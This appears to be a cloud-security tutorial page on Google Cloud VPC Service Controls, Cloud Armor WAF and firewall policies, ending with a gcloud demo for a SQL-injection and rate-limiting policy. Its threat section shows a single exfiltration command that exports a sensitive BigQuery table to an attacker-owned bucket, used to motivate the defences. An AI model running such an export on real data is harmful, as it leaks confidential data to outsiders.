Network Security: VPC Service Controls, Cloud Armor & Firewalls

Protecting against attacks and data exfiltration: VPC Service Controls perimeters, Cloud Armor WAF (OWASP Top 10) & DDoS defense, hierarchical firewall policies, and Private Service Connect.

On this page
1 Real-World Explanation 2 Technical Discussion 3 Cloud City Analogy 4 Hands-On Demo 5 Knowledge Check 6 Further Reading

1 Real-World Explanation

The Situation: The Threat of Data Exfiltration

Traditional network security focuses on keeping attackers out. But in the cloud, one of the greatest risks is data exfiltration by insiders or compromised credentials.

Even with strict IAM roles, a compromised service account with read access to BigQuery can simply run:
bq extract sensitive_table gs://attacker-owned-bucket/data.csv.
Because both projects exist in Google Cloud, traditional firewall rules cannot stop this call!

The Three Pillars of GCP Network Security
  • Cloud Armor: Edge WAF and DDoS mitigation. Protects against OWASP Top 10 vulnerabilities (SQLi, XSS, LFI/RFI), provides rate limiting, geo-blocking, and bot management.
  • VPC Service Controls (VPC-SC): Creates a security perimeter around Google-managed services (Cloud Storage, BigQuery, Vertex AI). Prevents data from leaving the perimeter, even with valid IAM credentials.
  • Hierarchical Firewall Policies: Enforces organization-wide security rules inherited by all folders and VPCs (e.g., mandate deny-all ingress on port 22/3389).

2 Technical Discussion & Architecture Diagrams

Layer 1 — Foundation: Zero Public IPs & Private Google Access

Never assign external public IP addresses to backend compute instances. Use Private Google Access or Private Service Connect (PSC) to reach Google APIs privately over Google's internal network.

Layer 2 — Practitioner: Cloud Armor Preconfigured WAF Rules

Enable preconfigured ModSecurity Core Rule Set (CRS) rules: evaluatePreconfiguredExpr('sqli-v33-stable') and evaluatePreconfiguredExpr('xss-v33-stable') to block web exploitation attempts.

Layer 3 — Architect: VPC Service Controls Perimeters & Ingress/Egress Rules

Deploy VPC Service Controls in Dry-Run Mode first to monitor audit logs for potential breakage. Once validated, enforce perimeter boundaries and define precise ingress/egress rules based on context-aware access levels.

Layer 4 — Staff: Cloud NGFW & Intrusion Detection (Cloud IDS)

Staff architects deploy Cloud Next Generation Firewall (NGFW) Enterprise with intrusion prevention (IPS) powered by Palo Alto Networks threat signatures to inspect east-west traffic inside the VPC.

Scope and planes

The resource model for Network Security: VPC Service Controls, Cloud Armor & Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.

Practitioner defaults and troubleshooting

Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as observed behaviour, may change.

Hidden dependencies and day-2 operations

Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.

Design-review questions

  1. What business requirement selects this service?
  2. What is its real scope?
  3. Which control-plane calls must succeed?
  4. What is the data-plane failure signal?
  5. Which quota or IP range saturates first?
  6. What is the blast radius of a bad policy?
  7. How are cost and usage attributed?
  8. How is rollback or migration tested?

What good looks like

  • Explicit scope and ownership
  • Least-privilege identity
  • Observable health and cost
  • Tested recovery and rollback
  • Documented alternative and exit path

Diagram Architectural Scope & Taxonomy: Why These Three Diagrams Exist

Architecture diagrams in this curriculum are not decorative illustrations; they are precision engineering models designed to answer three distinct, non-overlapping architectural questions for every topic:

D1 — Scope & Boundary Map (Structural Lens)

Question Answered: Where do execution and security boundaries lie?
Maps components into their isolation perimeters (Client Edge vs Project VPC vs Managed Services). Establishes trust boundaries, network ingress choke-points, and data-plane vs control-plane separation.

D2 — Request & Control Flow (Runtime Ingress Lens)

Question Answered: How does production traffic traverse the architecture securely?
Traces an end-to-end operational journey—from ingress initiation and IAM perimeter validation across Andromeda SDN to backend state persistence and audit logging.

D3 — Failure Injection & Resilience (Chaos Lens)

Question Answered: How does the system degrade, alert, and auto-heal under catastrophic failure?
Models the exact mechanics of component saturation, network timeouts, and health check evictions under stress, revealing observability signals and automated failover pathways.

4 Hands-On Demo

Hands-On Demo: Creating a Cloud Armor Security Policy

Protect an application against SQL injection attacks and rate-limit abusive clients.

# 1. Create Cloud Armor policy
gcloud compute security-policies create sec-policy-web \
    --description="WAF and rate limiting policy"

# 2. Add OWASP SQL Injection rule
gcloud compute security-policies rules create 1000 \
    --security-policy=sec-policy-web \
    --expression="evaluatePreconfiguredExpr('sqli-v33-stable')" \
    --action=deny-403 \
    --description="Block SQL Injection"

# 3. Add Rate Limiting (max 100 requests per minute per client IP)
gcloud compute security-policies rules create 2000 \
    --security-policy=sec-policy-web \
    --action=rate-based-ban \
    --rate-limit-threshold-count=100 \
    --rate-limit-threshold-interval-sec=60 \
    --ban-duration-sec=300 \
    --conform-action=allow \
    --exceed-action=deny-429 \
    --enforce-on-key=IP

# 4. Attach policy to backend service
gcloud compute backend-services update web-backend-service \
    --security-policy=sec-policy-web \
    --global
